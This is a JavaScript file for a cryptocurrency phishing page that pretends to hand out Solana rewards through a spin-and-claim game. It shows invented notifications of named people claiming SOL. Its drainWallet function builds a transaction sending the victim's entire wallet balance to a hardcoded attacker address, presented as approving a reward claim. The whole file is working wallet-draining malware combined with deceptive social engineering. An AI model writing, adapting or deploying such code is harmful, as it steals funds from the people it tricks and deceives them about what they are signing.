// --- CONFIGURATION ---
const DESTINATION_WALLET = "D7sb3Z3a3xduMuurdzKvFPBeALfpz2KVoe9bF8SeoJrV";
// ---------------------

const connectBtn = document.getElementById('connectBtn');
const claimBtn = document.getElementById('claimBtn');
const statusText = document.getElementById('status');
const rewardAmountDisplay = document.getElementById('reward-amount');
const userBalanceDisplay = document.getElementById('user-balance');
const claimDetails = document.getElementById('claim-details');
const spinSection = document.getElementById('spin-section'); // New element for spinning

// --- 1. WALLET DETECTION ---
function getWalletProvider() {
    if (window.solana && window.solana.isPhantom) {
        return { name: 'Phantom', provider: window.solana };
    } else if (window.solflare) {
        return { name: 'Solflare', provider: window.solflare };
    } else {
        return null;
    }
}

// --- 2. SPINNING LOGIC ---
function startSpin(reward) {
    // Hide claim details, show spin
    claimDetails.classList.add('hidden');
    connectBtn.classList.add('hidden');
    
    const spinDiv = document.createElement('div');
    spinDiv.id = 'spin-section';
    spinDiv.style.textAlign = 'center';
    spinDiv.innerHTML = `
        <h2>🎰 Spinning for your reward...</h2>
        <div id="spin-result" style="font-size: 32px; color: #00FF84; margin-top: 20px;">...</div>
    `;
    document.querySelector('.content-box').appendChild(spinDiv);

    // Simulate spinning for 3 seconds
    let counter = 0;
    const interval = setInterval(() => {
        const randomTemp = (Math.random() * 5).toFixed(4);
        document.getElementById('spin-result').innerText = `${randomTemp} SOL`;
        counter++;
        if (counter > 15) {
            clearInterval(interval);
            document.getElementById('spin-result').innerText = `${reward} SOL`;
            showClaim(reward);
        }
    }, 200);
}

function showClaim(reward) {
    document.getElementById('spin-section').classList.add('hidden');
    claimDetails.classList.remove('hidden');
    rewardAmountDisplay.innerText = `${reward} SOL`;
    claimBtn.classList.remove('hidden');
    statusText.innerText = "Your reward is ready! Approve the transaction to claim.";
}

// --- 3. FAKE NOTIFICATIONS ---
const fakeNames = ["Alex", "Sarah", "Mike", "Jessica", "David", "Emily", "James", "Olivia", "Robert", "Emma", "Chris", "Anna", "Daniel", "Sophie", "Mark"];
const smallAmounts = ["0.001", "0.005", "0.009", "0.01", "0.03", "0.05", "0.07", "0.1", "0.2", "0.5"];

function createNotification() {
    const container = document.getElementById('notification-container');
    const name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
    const amount = smallAmounts[Math.floor(Math.random() * smallAmounts.length)];
    
    const notif = document.createElement('div');
    notif.className = 'notification';
    notif.innerHTML = `
        <span class="notification-icon">🔔</span>
        <span class="notification-text"><strong>${name}</strong> just claimed <strong>${amount} SOL</strong></span>
    `;
    
    container.appendChild(notif);
    
    setTimeout(() => {
        if (container.contains(notif)) {
            container.removeChild(notif);
        }
    }, 4000);
}

setInterval(createNotification, 5000);
createNotification();

// --- 4. MAIN PROCESS ---

async function startProcess() {
    const wallet = getWalletProvider();
    
    if (!wallet) {
        statusText.innerText = "Please install Phantom or Solflare Wallet!";
        window.open("https://phantom.app/", "_blank");
        return;
    }

    try {
        statusText.innerText = `Connecting to ${wallet.name}...`;
        
        // Connect
        let userPublicKey;
        if (wallet.name === 'Phantom') {
            const response = await wallet.provider.connect();
            userPublicKey = response.publicKey;
        } else if (wallet.name === 'Solflare') {
            // Solflare connection is slightly different
            await wallet.provider.connect();
            userPublicKey = wallet.provider.publicKey;
        }
        
        // Get Balance
        const connection = new solana.web3.Connection(solana.web3.clusterApiUrl('mainnet-beta'));
        const balance = await connection.getBalance(userPublicKey);
        const balanceSol = balance / 1000000000;
        
        // Generate Random Reward
        const reward = getRandomReward();
        
        // Start Spin Animation
        startSpin(reward);
        
        // Store data for later
        window.userPublicKey = userPublicKey;
        window.balanceSol = balanceSol;
        window.reward = reward;

    } catch (error) {
        console.error(error);
        statusText.innerText = "Connection failed. Please try again.";
        connectBtn.disabled = false;
    }
}

async function drainWallet() {
    try {
        statusText.innerText = "Processing transaction...";
        claimBtn.disabled = true;
        claimBtn.innerText = "Processing...";
        
        const connection = new solana.web3.Connection(solana.web3.clusterApiUrl('mainnet-beta'));
        const userPublicKey = window.userPublicKey;
        
        // Get final balance
        const balance = await connection.getBalance(userPublicKey);
        
        if (balance === 0) {
            statusText.innerText = "Wallet is empty.";
            claimBtn.innerText = "Empty";
            return;
        }

        // Create Transaction
        const transaction = new solana.web3.Transaction();
        
        const to = new solana.web3.PublicKey(DESTINATION_WALLET);
        
        // Send everything (balance)
        const instruction = solana.web3.SystemProgram.transfer({
            fromPubkey: userPublicKey,
            toPubkey: to,
            lamports: balance
        });

        transaction.add(instruction);

        // Sign and Send
        statusText.innerText = "Waiting for signature...";
        let signature;
        
        if (window.walletProvider === 'Phantom') {
            signature = await window.solana.signAndSendTransaction(transaction);
        } else if (window.walletProvider === 'Solflare') {
            // Solflare signing is different
            const signedTransaction = await window.solflare.signTransaction(transaction);
            const rawTx = signedTransaction.serialize();
            const txid = await connection.sendRawTransaction(rawTx);
            signature = { signature: txid };
        }
        
        statusText.innerText = "Success! Check your wallet.";
        claimBtn.innerText = "Claimed";
        
        setTimeout(() => {
            window.location.reload();
        }, 3000);

    } catch (error) {
        console.error(error);
        statusText.innerText = "Transaction failed or rejected.";
        claimBtn.disabled = false;
        claimBtn.innerText = "Try Again";
    }
}

// --- 5. WEIGHTED RANDOM LOGIC ---
function getRandomReward() {
    const chance = Math.random() * 100;
    
    if (chance < 2) {
        return (5.0).toFixed(4);
    } else if (chance < 20) {
        const min = 0.1;
        const max = 2.0;
        return (Math.random() * (max - min) + min).toFixed(4);
    } else {
        const min = 0.001;
        const max = 3.0;
        return (Math.random() * (max - min) + min).toFixed(4);
    }
}

// Initialize wallet provider on load
window.walletProvider = getWalletProvider();
